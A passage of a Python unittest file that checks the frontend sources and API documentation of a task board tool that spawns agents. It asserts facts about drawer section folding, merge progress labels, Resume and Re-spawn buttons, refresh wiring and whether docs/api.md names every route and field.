        self.assertIn("var state = C.harvestStates[key];", load_static("drawer.js"))

    # -- AC #4: client-side only --

    def test_the_invalidation_issues_no_request(self):
        self.assertNotIn("fetch(", self.invalidate)
        # /api/harvest is still reached from exactly the two places it
        # always was -- the Merge click and "Merge all ready" -- both
        # POSTs; no speculative re-evaluation was added anywhere.
        self.assertEqual(
            sum(load_static(name).count('"/api/harvest"') for name in FRONTEND_FILES), 2)
        self.assertEqual(self.harvest.count('"/api/harvest"'), 2)


class DrawerSectionDiscoverabilityTests(unittest.TestCase):
    """Task-97: with a live session the drawer's scrolling body was
    measured at 155px against 1113px of content -- the whole ticket below
    the fold with nothing on screen saying so. Two changes, both in the
    drawer: the pane footer got a ceiling (the flex model itself is
    untouched), and every section now announces what it holds and folds.

    What is left here after task-118 is the half this shim cannot see:
    the CSS the rebalance IS (the flex model, the pane ceiling and its
    two opt-outs, the fade's opacity), and the source-shape claims that
    no section escapes the one builder and that the drawer's new code
    reaches into neither the poller nor the theater. The rendered
    sections -- headers, counts, folds, aria and what a re-open
    remembers -- are driven in tests/test_frontend_behaviour.py
    (DrawerSectionRenderTests)."""

    @classmethod
    def setUpClass(cls):
        cls.css = load_static("styles.css")
        cls.drawer = load_static("drawer.js")
        cls.state = load_static("state.js")
        cls.pane = load_static("pane.js")
        cls.detail = function_body(cls.drawer, "renderDrawerDetail")
        # Several of the builder's call sites wrap across lines, so the
        # greps below read a whitespace-normalized copy.
        cls.detail_flat = " ".join(cls.detail.split()).replace("( ", "(")
        cls.section_builder = function_body(cls.drawer, "drawerSection")

    def _css_rule(self, selector):
        start = self.css.index(selector + " {")
        return self.css[start:self.css.index("\n  }", start)]

    # -- AC #2/#4: every section says what it holds, and still holds it --

    def test_every_drawer_section_is_built_by_the_one_self_announcing_builder(self):
        # No section escapes the builder: a bare "drawer-section" div
        # would be a header with no count and no fold.
        self.assertNotIn('C.h("div", { className: "drawer-section" })', self.drawer)
        for key in ("milestone", "description", "acceptanceCriteria", "dependencies",
                    "implementationPlan", "implementationNotes", "branch"):
            self.assertIn('drawerSection("%s",' % key, self.detail_flat)

    def test_the_counts_are_checked_over_total_a_length_and_a_word_count(self):
        self.assertIn('acChecked + "/" + ac.length', self.detail_flat)
        self.assertIn("deps.length ? String(deps.length) : null", self.detail_flat)
        self.assertIn('pluralCount(descWords, "word")', self.detail_flat)
        self.assertIn('pluralCount(planWords, "word")', self.detail_flat)
        self.assertIn('pluralCount(notesWords, "word")', self.detail_flat)
        # The branch panel gets the same treatment as main's own AC list.
        self.assertIn('branchChecked + "/" + branchAc.length', self.detail_flat)

    # -- AC #3: folding, and whose choice wins --

    def test_a_viewers_own_toggle_beats_the_size_derived_default(self):
        starts = function_body(self.drawer, "sectionStartsCollapsed")
        self.assertIn("var stored = C.drawerSectionCollapsed[key];", starts)
        self.assertIn('return typeof stored === "boolean" ? stored : !!autoCollapse;', starts)
        # ...and that choice is remembered the same per-viewer way the
        # drawer's wide mode and the theater rail are (task-68/93).
        self.assertIn('drawerSections: "centrale-drawer-sections"', self.state)
        self.assertIn("C.drawerSectionCollapsed = readStoredDrawerSections();", self.state)
        persist = function_body(self.state, "persistDrawerSectionCollapsed")
        self.assertIn("C.drawerSectionCollapsed[key] = !!collapsed;", persist)
        # A corrupt/unavailable store falls back to "no overrides", i.e.
        # to the size-derived defaults -- never to a crash.
        reader = function_body(self.state, "readStoredDrawerSections")
        self.assertIn("return {};", reader)

    def test_folding_hides_a_body_and_never_a_header(self):
        collapsed = self._css_rule("  .drawer-section.collapsed > .drawer-section-body")
        self.assertIn("display: none", collapsed)
        # The header row itself is the button, so a folded section is
        # still keyboard reachable and still states its count.
        self.assertIn(".drawer-section-toggle {", self.css)
        self.assertIn(".drawer-section-count {", self.css)
        self.assertIn('"aria-expanded": collapsed ? "false" : "true"', self.section_builder)
        self.assertIn('"aria-controls": bodyId', self.section_builder)

    # -- AC #1/#5: the rebalance, and what it deliberately does not touch --

    def test_the_pane_footer_gained_a_ceiling_and_nothing_else_moved(self):
        # The ceiling is the whole of the rebalance...
        self.assertIn(
            "#drawer > #drawer-pane-area:not(:empty) { max-height: max(248px, 30vh); }",
            self.css)
        # ...and it is scoped to the drawer's own child, so the theater
        # (which MOVES this element into itself, task-73) is unaffected,
        # and wide mode -- which exists to READ the pane -- opts out.
        self.assertIn(
            "#drawer.wide > #drawer-pane-area:not(:empty) { max-height: none; }",
            self.css)
        # The delicate flex rules the ceiling sits on top of are as they
        # were: the body still shrinks first, and the pane footer still
        # disables its automatic minimum size.
        body_rule = self._css_rule("  #drawer-body")
        self.assertIn("flex: 1 1000 auto;", body_rule)
        pane_rule = self._css_rule("  #drawer-pane-area:not(:empty)")
        self.assertIn("flex: 0 1 auto;", pane_rule)
        self.assertIn("min-height: 168px;", pane_rule)
        self.assertIn("overflow: hidden;", pane_rule)

    def test_the_footers_stay_pinned_and_the_pane_poller_is_untouched(self):
        # Every footer band keeps flex: none -- none of them scrolls or
        # shrinks away with the body (the pane's own rule follows below
        # it and is the single exception, exactly as before).
        footers = self._css_rule(
            "  #drawer-session-area:not(:empty), #drawer-pane-area:not(:empty),"
            " #drawer-harvest-area:not(:empty), #drawer-spawn-area:not(:empty)")
        self.assertIn("flex: none;", footers)
        # task-97 changed no JavaScript in the poller's file, so the
        # single-poller contract and the theater rail are untouched: the
        # drawer's new code never reaches into either.
        self.assertNotIn("panePoll", self.drawer)
        self.assertNotIn("drawer-pane-pre", self.drawer)
        self.assertNotIn("drawerSection", self.pane)

    def test_the_bottom_fade_is_a_cue_and_only_when_there_is_more_below(self):
        fade = function_body(self.drawer, "syncDrawerBodyFade")
        self.assertIn("body.scrollHeight - body.clientHeight - body.scrollTop > 4", fade)
        self.assertIn('body.classList.toggle("has-more", more)', fade)
        self.assertIn("#drawer-body.has-more .drawer-body-fade { opacity: 1; }", self.css)
        self.assertIn("opacity: 0;", self._css_rule("  .drawer-body-fade"))


class MergeGateProgressTests(unittest.TestCase):
    """Task-96: clicking Merge blocks on one POST that, on a project with
    a checkCommand, spends practically all of its time in the test suite
    -- and the button only ever said "Merging…". What is left here after
    task-118 is the label TABLE and the rules that hold for every entry
    in it: that the label comes only from the stage the server named,
    that every stage the server can publish has one, and that not one of
    them contains a digit, a percentage or a clock. A driven run visits
    only the stages it is fed; these are claims about all of them. The
    button tracked through a held-open merge is driven in
    tests/test_frontend_behaviour.py (MergeGateProgressBehaviourTests)."""

    @classmethod
    def setUpClass(cls):
        cls.harvest = load_static("harvest.js")

    # -- AC #3: server-observed, never inferred --

    def test_the_label_comes_only_from_the_published_stage_name(self):
        label = function_body(self.harvest, "mergeProgressLabel")
        # One lookup, keyed by the stage the server named, with null --
        # the plain-fallback signal -- for anything unmatched. No gate
        # order, no index arithmetic, no clock.
        self.assertIn("if (!progress || !matches(progress)) return null;", label)
        self.assertIn("return MERGE_STAGE_LABELS[progress.gate] || null;", label)
        self.assertNotIn("Date", label)

    def test_the_check_gate_label_names_the_tests(self):
        self.assertIn('checkCommand: "Running tests…"', self.harvest)
        # ...and every stage the server can report has a label, so no
        # in-flight gate leaves the button silently on its fallback.
        for stage in harvest.PROGRESS_STAGES:
            self.assertIn(stage + ": \"", self.harvest, stage)

    # -- AC #2: no time, anywhere --

    def test_no_label_shows_elapsed_time_an_estimate_or_a_percentage(self):
        block = self.harvest[self.harvest.index("var MERGE_STAGE_LABELS"):]
        block = block[:block.index("};")]
        for line in block.splitlines():
            self.assertNotIn("%", line)
            self.assertFalse(any(ch.isdigit() for ch in line), line)
        # The record the server publishes has no timing field to show in
        # the first place -- see tests/test_harvest.py's progress tests --
        # and nothing here reads a clock to make one up.
        poll = function_body(self.harvest, "pollMergeProgress")
        self.assertNotIn("Date", poll)
        self.assertNotIn("performance", poll)

    # -- AC #5: polling is bounded by this client's own request --

    def test_the_poll_starts_with_the_post_and_is_stopped_when_it_lands(self):
        task = function_body(self.harvest, "harvestTask")
        start = task.index("var stopProgress = pollMergeProgress(")
        self.assertLess(start, task.index('fetch("/api/harvest"'))
        self.assertIn("stopProgress(); // the response has landed", task)
        # The stop sits in the settle handler that runs on EVERY outcome
        # -- merged, blocked, already-merged and error alike.
        self.assertLess(task.index('status: "error"'), task.index("stopProgress();"))


class ResumeAnInterruptedActiveTaskTests(unittest.TestCase):
    """Task-116: an In Progress task with a branch and no live session is
    an interrupted task, whatever its worktree looks like. Reading only
    `worktreeDirty` called an agent that was killed a moment AFTER
    committing "finished" and offered nothing but a fresh Re-spawn -- the
    2026-09-03 tmux-server death stranded 22 spawns exactly that way.
    What is left here after task-118 is the shape of the rule rather
    than its output: that it names no status of its own (so a repo with
    custom columns gets the same answer), that it reads the BRANCH's
    copy and never main's, that it is re-run where /api/task lands, and
    that no reader of spawnConfirmPending is left checking the untagged
    "something is armed" -- a count over two whole files, which no walk
    of one drawer can make. The buttons themselves are driven in
    tests/test_frontend_behaviour.py (ResumeWhenActiveBehaviourTests)."""

    @classmethod
    def setUpClass(cls):
        cls.drawer = load_static("drawer.js")
        cls.tasks = load_static("tasks.js")
        cls.spawn = load_static("spawn.js")
        cls.board = load_static("board.js")
        cls.is_active = function_body(cls.tasks, "isActiveStatus")
        cls.branch_active = function_body(cls.drawer, "drawerBranchStatusIsActive")
        # task-125: the Resume-vs-Re-spawn decision moved into the
        # drawer's one secondary row, which the harvest area builds --
        # the rule is unchanged, the container it renders into is not.
        cls.spawn_area = function_body(cls.drawer, "renderDrawerSecondaryRow")

    # -- AC #4: the branch's own copy, and no hardcoded status names --

    def test_the_status_helper_is_built_from_the_existing_helpers(self):
        self.assertIn("C.isDoneStatus(status)", self.is_active)
        self.assertIn("isFirstColumnStatus(project, status)", self.is_active)
        # No status name of its own: "Done"/"To Do"/"In Progress" appear
        # nowhere in the helper or in the drawer's use of it, so a repo
        # with custom columns gets the same answer.
        for name in ('"Done"', '"To Do"', '"In Progress"'):
            self.assertNotIn(name, self.is_active, name)
            self.assertNotIn(name, self.branch_active, name)
            self.assertNotIn(name, self.spawn_area, name)

    def test_the_status_is_read_from_the_branchs_own_copy(self):
        # currentDrawer.branchTask (task-22's branch-side read), never
        # currentDrawer.summary, which is main's copy.
        self.assertIn("drawer.branchTask.status", self.branch_active)
        self.assertNotIn("summary", self.branch_active)
        # ...and an unread/absent branch copy is not "active".
        self.assertIn("if (!drawer || !drawer.branchTask) return false;", self.branch_active)

    def test_the_action_area_is_re_rendered_when_the_branch_copy_lands(self):
        # branchTask does not exist on the first render pass, so the
        # decision has to be taken again once /api/task resolves -- next
        # to the session area's own re-render for the same reason.
        # task-125: both action areas, since the row that asks the
        # question is the harvest area's.
        detail = function_body(self.drawer, "renderDrawerDetail")
        stash = self.drawer.index("C.currentDrawer.branchTask = branchTask;")
        self.assertNotIn("renderDrawerHarvestArea();", detail)
        self.assertIn("renderDrawerHarvestArea();", self.drawer[stash:stash + 900])

    # -- AC #1 / #2: the widened condition --

    def test_a_dirty_worktree_is_still_one_of_the_two_ways_in(self):
        self.assertIn(
            "if (task.worktreeDirty || drawerBranchStatusIsActive()) {", self.spawn_area)

    def test_resume_leads_and_respawn_stays_reachable(self):
        resume = self.spawn_area.index("renderDrawerResumeAction(row, area, projectName, taskId);")
        secondary = self.spawn_area.index(
            "renderDrawerRespawnAction(row, area, projectName, taskId, true);")
        self.assertLess(resume, secondary)
        # The secondary Re-spawn leaves the shared spawn-status line to
        # the primary action rather than printing it a second time.
        respawn = function_body(self.drawer, "renderDrawerRespawnAction")
        self.assertIn("if (secondary) return;", respawn)
        self.assertLess(respawn.index("if (secondary) return;"), respawn.index('status === "error"'))

    def test_one_armed_confirm_per_action(self):
        # Resume and Re-spawn now render together and share one
        # spawnConfirmPending entry per task: arming either must not arm
        # the other, and confirming must run the action that was armed.
        armed = function_body(self.spawn, "armedFor")
        self.assertIn("pending.action === action", armed)
        for action in ("spawn", "respawn", "resume"):
            self.assertIn('armedFor(pending, "%s")' % action, self.spawn, action)
            self.assertIn('action: "%s"' % action, self.spawn, action)
        self.assertIn('C.armedFor(pending, "resume")', self.drawer)
        self.assertIn('C.armedFor(pending, "respawn")', self.drawer)
        # No reader of spawnConfirmPending is left checking the untagged
        # "something is armed": every one of them goes through armedFor,
        # which is the only place the raw expiry comparison survives.
        # (harvest.js's reconcile/adopt/discard confirms and settings.js's
        # own each have their own map, and are not affected.)
        self.assertIn("pending.expires > Date.now()", armed)
        for name in ("spawn.js", "drawer.js"):
            src = load_static(name)
            self.assertGreater(src.count("C.spawnConfirmPending["), 0, name)
            self.assertEqual(
                src.count("pending.expires > Date.now()"), 1 if name == "spawn.js" else 0, name)

    # -- AC #5: the card footer, deliberately left alone --

    def test_the_card_badge_keeps_its_worktree_dirty_rule_with_the_reason(self):
        self.assertIn("} else if (effBranch && task.worktreeDirty && !live) {", self.board)
        # The card renders from board data, which has no branch-side task
        # copy -- and the reasoning for not giving it one is recorded at
        # the badge itself rather than only in the task file.
        badge = self.board.index('className: "badge-interrupted"')
        reason = self.board[self.board.index("task-116", badge - 1500):badge]
        self.assertIn("_branch_task_view", reason)
        self.assertIn("per branch-bearing task", reason)
        self.assertNotIn("branchTask", self.board)


class DrawerBodyRefreshContractTests(unittest.TestCase):
    """Task-126: the drawer's body rides the ordinary refresh tick.

    What the refresh DOES -- the change appearing without a reopen, an
    unchanged payload touching no node, a superseded response discarded,
    a failed one staying silent, the fetch that is not issued with the
    drawer closed, and the timer it does not arm -- is driven over the
    real sources in tests/test_frontend_behaviour.py
    (DrawerBodyRefreshBehaviourTests). What is left here is the pair of
    cross-file counts no walk of one drawer can make."""

    @classmethod
    def setUpClass(cls):
        cls.drawer = load_static("drawer.js")
        cls.api = load_static("api.js")
        cls.state = load_static("state.js")

    def test_the_open_and_the_refresh_share_one_call_site_and_one_cadence(self):
        # A second fetch would be a second place for the seq guard, the
        # payload check and the branchTask/detail stash to disagree; a
        # second caller would be a second cadence to reason about.
        self.assertEqual(
            sum(load_static(name).count('fetch("/api/task?') for name in FRONTEND_FILES), 1)
        self.assertIn('fetch("/api/task?', function_body(self.drawer, "fetchDrawerDetail"))
        # Both callers go through it, and `initial` is what tells them
        # apart -- the open owns the loading placeholder and the error.
        self.assertIn("fetchDrawerDetail(project, task.id, true);",
                      function_body(self.drawer, "openDrawer"))
        self.assertIn("fetchDrawerDetail(project, C.currentDrawer.id, false);",
                      function_body(self.drawer, "refreshDrawerDetail"))
        # ...reached from doRefresh, the one entry point every
        # fetch-driven refresh already goes through, and nowhere else.
        self.assertIn("C.refreshDrawerDetail();", function_body(self.api, "doRefresh"))
        self.assertEqual(
            sum(load_static(name).count("C.refreshDrawerDetail()") for name in FRONTEND_FILES), 1)

    def test_both_pieces_of_refresh_state_are_declared_on_the_namespace(self):
        # state.js rule 1: a shared value that gets REASSIGNED lives on
        # C, so no file can hold a stale alias of it.
        for name in ("C.drawerDetailPayload = null;", "C.drawerDetailInFlightSeq = 0;"):
            self.assertIn(name, self.state, name)
        # ...and the drawer is the only other file that writes either.
        for field in ("C.drawerDetailPayload =", "C.drawerDetailInFlightSeq ="):
            writers = [n for n in FRONTEND_FILES if field in load_static(n)]
            self.assertEqual(writers, ["state.js", "drawer.js"], field)


class ApiReferenceIsCurrentTests(unittest.TestCase):
    """docs/api.md names every route and every response field the code
    actually produces.

    Task-140. That document is where an external caller learns the API,
    and it is a hand-kept list of routes and fields -- the same shape of
    claim task-131 pinned for docs/architecture.md's module table, and
    the same way it drifts: task-104's audit found four separate holes
    at once (a missing `agentEntries`, a missing `agents`, a missing
    `milestone`/`milestoneTitle` pair, and two miscounts), every one of
    them a name the code emitted and the doc had never heard of.

    So: a route added to `do_GET`/`do_POST`, a field added to a board
    task, a top-level response key or a settings key fails the suite
    until docs/api.md names it. Only the NAMES -- what the doc says
    about each one is prose no test should be grading.
    """

    REPO_DIR = server.BASE_DIR

    def _doc(self):
        with open(os.path.join(self.REPO_DIR, "docs", "api.md"), encoding="utf-8") as f:
            return f.read()

    def _server_source(self):
        with open(os.path.join(self.REPO_DIR, "server.py"), encoding="utf-8") as f:
            return f.read()

    def _assert_documented(self, names, doc, what):
        """Every name in `names` appears backticked somewhere in `doc`."""
        missing = sorted(n for n in names if "`%s`" % n not in doc)
        self.assertEqual(
            missing, [],
            "docs/api.md does not name %s: %s -- document each one (task-140)"
            % (what, ", ".join(missing)))

    def test_every_dispatched_route_is_documented_and_vice_versa(self):
        # The routes the handler actually dispatches, read off the two
        # `path == "/api/..."` chains rather than a list kept by hand.
        routes = set(re.findall(r'path == "(/api/[a-z-]+)"', self._server_source()))
        self.assertGreater(len(routes), 10, sorted(routes))  # not vacuous

        headings = re.findall(r"^#{2,3} (.*)$", self._doc(), re.M)
        documented = set()
        for heading in headings:
            documented.update(re.findall(r"/api/[a-z-]+", heading))

        undocumented = sorted(routes - documented)
        self.assertEqual(
            undocumented, [],
            "these routes are dispatched by server.py but have no section in "
            "docs/api.md: %s (task-140)" % ", ".join(undocumented))
        phantom = sorted(documented - routes)
        self.assertEqual(
            phantom, [],
            "docs/api.md documents these routes, which server.py no longer "
            "dispatches: %s (task-140)" % ", ".join(phantom))

    def test_every_board_task_field_centrale_adds_is_documented_and_counted(self):
        doc = self._doc()
        # The fields _load_project_board layers onto each backlog task:
        # the direct assignments, plus the lifecycle pair merged in from
        # get_agent_lifecycle (an in-memory read, no subprocess).
        fields = set(re.findall(r'merged\["([A-Za-z]+)"\] =', self._server_source()))
        fields |= set(server.get_agent_lifecycle("no-such-project", "TASK-0"))
        self.assertGreater(len(fields), 5, sorted(fields))  # not vacuous
        self._assert_documented(fields, doc, "these fields GET /api/board adds to a task")

        # ...and the sentence introducing them counts them correctly:
        # two of task-104's four findings were miscounts.
        words = ["zero", "one", "two", "three", "four", "five", "six", "seven",
                 "eight", "nine", "ten", "eleven", "twelve"]
        stated = re.search(r"plus (\w+) fields Centrale adds", doc)
        self.assertIsNotNone(stated, "GET /api/board no longer says how many fields it adds")
        self.assertEqual(
            stated.group(1), words[len(fields)],
            "GET /api/board adds %d fields (%s) but docs/api.md says %r (task-140)"
            % (len(fields), ", ".join(sorted(fields)), stated.group(1)))

    def test_every_response_key_the_handler_layers_on_is_documented(self):
        # `response[...] =` covers the board's top-level flags (version,
        # codeDrift, capabilities, ...), GET /api/task's branchTask and
        # the discard preview's own three.
        keys = set(re.findall(r'response\["([A-Za-z]+)"\] =', self._server_source()))
        self.assertGreater(len(keys), 5, sorted(keys))  # not vacuous
        self._assert_documented(keys, self._doc(), "these response keys server.py sets")

    def test_every_settings_field_is_documented(self):
        import settings  # local import, as server.py itself does

        keys = set(settings.current_settings({"projects": [], "agents": {}}))
        self.assertGreater(len(keys), 5, sorted(keys))  # not vacuous
        self._assert_documented(keys, self._doc(), "these GET /api/settings fields")
